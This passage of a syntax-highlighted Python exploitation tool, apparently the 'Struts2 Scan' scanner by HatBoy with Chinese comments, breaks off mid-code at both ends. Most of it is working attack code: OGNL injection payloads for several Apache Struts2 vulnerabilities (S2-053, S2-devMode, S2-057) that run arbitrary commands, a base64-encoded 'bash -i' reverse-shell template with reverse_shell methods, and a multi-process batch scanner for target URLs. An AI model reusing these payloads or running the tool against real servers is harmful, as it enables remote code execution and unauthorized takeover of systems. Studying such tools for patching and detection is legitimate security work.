class="string">&quot;%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D&#x27;&#123;cmd&#125;&#x27;).(%23iswin%3D(%40java.lang.System%40getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(%23cmds%3D(%23iswin%3F%7B&#x27;cmd.exe&#x27;%2C&#x27;%2Fc&#x27;%2C%23cmd%7D%3A%7B&#x27;%2Fbin%2Fbash&#x27;%2C&#x27;-c&#x27;%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;&#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            self.data = <span class="string">&quot;username=test&amp;password=&#123;exp&#125;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers:</span><br><span class="line">            self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        num1 = random.randint(<span class="number">10000</span>, <span class="number">100000</span>)</span><br><span class="line">        num2 = random.randint(<span class="number">10000</span>, <span class="number">100000</span>)</span><br><span class="line">        poc = self.check_poc.<span class="built_in">format</span>(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.<span class="built_in">format</span>(exp=poc)</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = <span class="built_in">str</span>(num1 + num2)</span><br><span class="line">        <span class="keyword">if</span> html.startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">elif</span> nn <span class="keyword">in</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-053&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        data = self.data.<span class="built_in">format</span>(exp=self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_devMode</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-devMode漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span></span><br><span class="line">    web_path = <span class="string">&quot;?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=Is-Struts2-Vul-URL&amp;pp=%2f&amp;reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=&#123;cmd&#125;&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-devMode&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_path</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + self.web_path, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        html = get_stream(self.url + self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd)), self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_057</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-057漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-057:影响版本Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16; GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span></span><br><span class="line">    check_poc = <span class="string">&quot;%24%7BNUM1%2BNUM2%7D&quot;</span></span><br><span class="line">    exec_payload1 = <span class="string">&quot;%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D&quot;</span></span><br><span class="line">    exec_payload2 = <span class="string">&quot;%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&quot;</span></span><br><span class="line">    exec_payload3 = <span class="string">&quot;%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D&quot;</span></span><br><span class="line">    exec_payload4 = <span class="string">&quot;%24%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> url.endswith(<span class="string">&quot;.action&quot;</span>):</span><br><span class="line">            rindex = url.rindex(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            self.url = url[:rindex + <span class="number">1</span>]</span><br><span class="line">            self.name = url[rindex + <span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">elif</span> url.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">            self.url = url</span><br><span class="line">            self.name = <span class="string">&quot;index.action&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.url = url + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">            self.name = <span class="string">&quot;index.action&quot;</span></span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        num1 = random.randint(<span class="number">10000</span>, <span class="number">100000</span>)</span><br><span class="line">        num2 = random.randint(<span class="number">10000</span>, <span class="number">100000</span>)</span><br><span class="line">        poc = self.check_poc.replace(<span class="string">&quot;NUM1&quot;</span>, <span class="built_in">str</span>(num1)).replace(<span class="string">&quot;NUM2&quot;</span>, <span class="built_in">str</span>(num2))</span><br><span class="line">        url = self.url + poc + <span class="string">&quot;/&quot;</span> + self.name</span><br><span class="line">        html = get_302(url, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(num1 + num2) <span class="keyword">in</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-057&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">choice_exp</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;选择可用的exp&quot;&quot;&quot;</span></span><br><span class="line">        payloads = [self.exec_payload1, self.exec_payload2, self.exec_payload3, self.exec_payload4]</span><br><span class="line">        hash_str = get_hash()</span><br><span class="line">        <span class="keyword">for</span> exp <span class="keyword">in</span> payloads:</span><br><span class="line">            payload = exp.<span class="built_in">format</span>(cmd=quote(<span class="string">&quot;echo &quot;</span> + hash_str))</span><br><span class="line">            url = self.url + payload + <span class="string">&quot;/&quot;</span> + self.name</span><br><span class="line">            html = get_302(url, self.headers, self.encoding)</span><br><span class="line">            <span class="keyword">if</span> hash_str <span class="keyword">in</span> html:</span><br><span class="line">                <span class="keyword">return</span> exp</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR: 无可用Payload!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        exp = self.choice_exp()</span><br><span class="line">        <span class="keyword">if</span> exp.startswith(<span class="string">&#x27;ERROR:&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> exp</span><br><span class="line"></span><br><span class="line">        payload = exp.<span class="built_in">format</span>(cmd=quote(cmd))</span><br><span class="line">        url = self.url + payload + <span class="string">&quot;/&quot;</span> + self.name</span><br><span class="line">        html = get_302(url, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有漏洞名称</span></span><br><span class="line">s2_dict = &#123;<span class="string">&#x27;S2_001&#x27;</span>: S2_001, <span class="string">&#x27;S2_003&#x27;</span>: S2_003, <span class="string">&#x27;S2_005&#x27;</span>: S2_005, <span class="string">&#x27;S2_007&#x27;</span>: S2_007, <span class="string">&#x27;S2_008&#x27;</span>: S2_008, <span class="string">&#x27;S2_009&#x27;</span>: S2_009,</span><br><span class="line">           <span class="string">&#x27;S2_012&#x27;</span>: S2_012, <span class="string">&#x27;S2_013&#x27;</span>: S2_013, <span class="string">&#x27;S2_015&#x27;</span>: S2_015, <span class="string">&#x27;S2_016&#x27;</span>: S2_016, <span class="string">&#x27;S2_019&#x27;</span>: S2_019, <span class="string">&#x27;S2_029&#x27;</span>: S2_029,</span><br><span class="line">           <span class="string">&#x27;S2_032&#x27;</span>: S2_032, <span class="string">&#x27;S2_033&#x27;</span>: S2_033, <span class="string">&#x27;S2_037&#x27;</span>: S2_037, <span class="string">&#x27;S2_045&#x27;</span>: S2_045, <span class="string">&#x27;S2_046&#x27;</span>: S2_046, <span class="string">&#x27;S2_048&#x27;</span>: S2_048,</span><br><span class="line">           <span class="string">&#x27;S2_052&#x27;</span>: S2_052, <span class="string">&#x27;S2_053&#x27;</span>: S2_053, <span class="string">&#x27;S2_devMode&#x27;</span>: S2_devMode, <span class="string">&quot;S2_057&quot;</span>: S2_057&#125;</span><br><span class="line"><span class="comment"># S2-052不支持漏洞扫描和检查</span></span><br><span class="line">s2_list1 = [S2_001, S2_003, S2_005, S2_007, S2_008, S2_009, S2_012, S2_013, S2_015, S2_016, S2_019,</span><br><span class="line">           S2_029, S2_032, S2_033, S2_037, S2_045, S2_046, S2_048, S2_053, S2_devMode, S2_057]</span><br><span class="line">s2_list = [<span class="string">&#x27;S2_001&#x27;</span>, <span class="string">&#x27;S2_003&#x27;</span>, <span class="string">&#x27;S2_005&#x27;</span>, <span class="string">&#x27;S2_007&#x27;</span>, <span class="string">&#x27;S2_008&#x27;</span>, <span class="string">&#x27;S2_009&#x27;</span>, <span class="string">&#x27;S2_012&#x27;</span>, <span class="string">&#x27;S2_013&#x27;</span>, <span class="string">&#x27;S2_015&#x27;</span>, <span class="string">&#x27;S2_016&#x27;</span>, <span class="string">&#x27;S2_019&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;S2_029&#x27;</span>, <span class="string">&#x27;S2_032&#x27;</span>, <span class="string">&#x27;S2_033&#x27;</span>, <span class="string">&#x27;S2_037&#x27;</span>, <span class="string">&#x27;S2_045&#x27;</span>, <span class="string">&#x27;S2_046&#x27;</span>, <span class="string">&#x27;S2_048&#x27;</span>, <span class="string">&#x27;S2_053&#x27;</span>, <span class="string">&#x27;S2_devMode&#x27;</span>, <span class="string">&#x27;S2_057&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持获取WEB路径的漏洞名称列表</span></span><br><span class="line">webpath_names = [<span class="string">&quot;S2_001&quot;</span>, <span class="string">&quot;S2_005&quot;</span>, <span class="string">&quot;S2_013&quot;</span>, <span class="string">&quot;S2_016&quot;</span>, <span class="string">&quot;S2_019&quot;</span>, <span class="string">&quot;S2_032&quot;</span>, <span class="string">&quot;S2_037&quot;</span>, <span class="string">&quot;S2_045&quot;</span>, <span class="string">&quot;S2_046&quot;</span>, <span class="string">&quot;S2_devMode&quot;</span>]</span><br><span class="line"><span class="comment"># 支持命令执行的漏洞名称列表</span></span><br><span class="line">exec_names = [<span class="string">&quot;S2_001&quot;</span>, <span class="string">&quot;S2_003&quot;</span>, <span class="string">&quot;S2_005&quot;</span>, <span class="string">&quot;S2_007&quot;</span>, <span class="string">&quot;S2_008&quot;</span>, <span class="string">&quot;S2_009&quot;</span>, <span class="string">&quot;S2_013&quot;</span>, <span class="string">&quot;S2_015&quot;</span>, <span class="string">&quot;S2_016&quot;</span>, <span class="string">&quot;S2_019&quot;</span>,</span><br><span class="line">              <span class="string">&quot;S2_029&quot;</span>, <span class="string">&quot;S2_032&quot;</span>, <span class="string">&quot;S2_033&quot;</span>, <span class="string">&quot;S2_037&quot;</span>, <span class="string">&quot;S2_045&quot;</span>, <span class="string">&quot;S2_046&quot;</span>, <span class="string">&quot;S2_048&quot;</span>, <span class="string">&quot;S2_052&quot;</span>, <span class="string">&quot;S2_053&quot;</span>, <span class="string">&quot;S2_devMode&quot;</span>,</span><br><span class="line">              <span class="string">&quot;S2_057&quot;</span>]</span><br><span class="line"><span class="comment"># 支持反弹shell的漏洞名称列表</span></span><br><span class="line">reverse_names = [<span class="string">&quot;S2_001&quot;</span>, <span class="string">&quot;S2_007&quot;</span>, <span class="string">&quot;S2_008&quot;</span>, <span class="string">&quot;S2_009&quot;</span>, <span class="string">&quot;S2_013&quot;</span>, <span class="string">&quot;S2_015&quot;</span>, <span class="string">&quot;S2_016&quot;</span>, <span class="string">&quot;S2_019&quot;</span>, <span class="string">&quot;S2_029&quot;</span>, <span class="string">&quot;S2_032&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;S2_033&quot;</span>, <span class="string">&quot;S2_037&quot;</span>, <span class="string">&quot;S2_045&quot;</span>, <span class="string">&quot;S2_046&quot;</span>, <span class="string">&quot;S2_048&quot;</span>, <span class="string">&quot;S2_052&quot;</span>, <span class="string">&quot;S2_053&quot;</span>, <span class="string">&quot;S2_devMode&quot;</span>, <span class="string">&quot;S2_057&quot;</span>]</span><br><span class="line"><span class="comment"># 支持文件上传的漏洞名称列表</span></span><br><span class="line">upload_names = [<span class="string">&quot;S2_013&quot;</span>, <span class="string">&quot;S2_016&quot;</span>, <span class="string">&quot;S2_019&quot;</span>, <span class="string">&quot;S2_045&quot;</span>, <span class="string">&quot;S2_046&quot;</span>]</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> ____  _              _       ____    ____                  </span></span><br><span class="line"><span class="string">/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  </span></span><br><span class="line"><span class="string">\___ \| __| &#x27;__| | | | __/ __| __) | \___ \ / __/ _` | &#x27;_ \ </span></span><br><span class="line"><span class="string"> ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |</span></span><br><span class="line"><span class="string">|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                      Author By HatBoy        </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_info</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;漏洞详情介绍&quot;&quot;&quot;</span></span><br><span class="line">    click.secho(<span class="string">&quot;[+] 支持如下Struts2漏洞:&quot;</span>, fg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> s2_dict.items():</span><br><span class="line">        click.secho(v.info, fg=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_one</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;检测单个漏洞&quot;&quot;&quot;</span></span><br><span class="line">    result = s.check()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_one</span>(<span class="params">url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描单个URL漏洞&quot;&quot;&quot;</span></span><br><span class="line">    click.secho(<span class="string">&#x27;[+] 正在扫描URL:&#x27;</span> + url, fg=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">    ss = [s(url, data, headers, encoding) <span class="keyword">for</span> s <span class="keyword">in</span> s2_list1]</span><br><span class="line">    <span class="keyword">with</span> futures.ThreadPoolExecutor(max_workers=<span class="number">10</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        results = <span class="built_in">list</span>(executor.<span class="built_in">map</span>(check_one, ss))</span><br><span class="line">    results = &#123;r <span class="keyword">for</span> r <span class="keyword">in</span> results <span class="keyword">if</span> r&#125;</span><br><span class="line">    click.secho(<span class="string">&#x27;[*] ----------------results------------------&#x27;</span>.<span class="built_in">format</span>(url=url), fg=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> results) <span class="keyword">and</span> (<span class="keyword">not</span> is_quiet):</span><br><span class="line">        click.secho(<span class="string">&#x27;[*] &#123;url&#125; 未发现漏洞&#x27;</span>.<span class="built_in">format</span>(url=url), fg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> r.startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            click.secho(<span class="string">&#x27;[ERROR] &#123;url&#125; 访问出错: &#123;error&#125;&#x27;</span>.<span class="built_in">format</span>(url=url, error=r[<span class="number">6</span>:]), fg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            click.secho(<span class="string">&#x27;[*] &#123;url&#125; 存在漏洞: &#123;name&#125;&#x27;</span>.<span class="built_in">format</span>(url=url, name=r), fg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_more</span>(<span class="params">urls, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;批量扫描URL&quot;&quot;&quot;</span></span><br><span class="line">    scan = partial(scan_one, data=data, headers=headers, encoding=encoding)</span><br><span class="line">    <span class="keyword">with</span> futures.ProcessPoolExecutor(max_workers=process) <span class="keyword">as</span> executor:</span><br><span class="line">        results = <span class="built_in">list</span>(executor.<span class="built_in">map</span>(scan, urls))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CONTEXT_SETTINGS = <span class="built_in">dict</span>(help_option_names=[<span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;--help&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@click.command(<span class="params">context_settings=CONTEXT_SETTINGS</span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--info&#x27;</span>, is_flag=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;漏洞信息介绍&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-v&#x27;</span>, <span class="string">&#x27;--version&#x27;</span>, is_flag=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;显示工具版本&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;URL地址&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-n&#x27;</span>, <span class="string">&#x27;--name&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定漏洞名称, 漏洞名称详见info&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;批量扫描URL文件, 一行一个URL&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--data&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;POST参数, 需要使用的payload使用&#123;exp&#125;填充, 如: name=test&amp;passwd=&#123;exp&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--encode&#x27;</span>, default=<span class="string">&quot;UTF-8&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;页面编码, 默认UTF-8编码&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--proxy&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;HTTP代理. 格式为http://ip:port&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;HTTP超时时间, 默认10s&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-w&#x27;</span>, <span class="string">&#x27;--workers&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;批量扫描进程数, 默认为10个进程&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--header&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;HTTP请求头, 格式为: key1=value1&amp;key2=value2&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-e&#x27;</span>, <span class="string">&#x27;--exec&#x27;</span>, is_flag=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;进入命令执行shell&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span 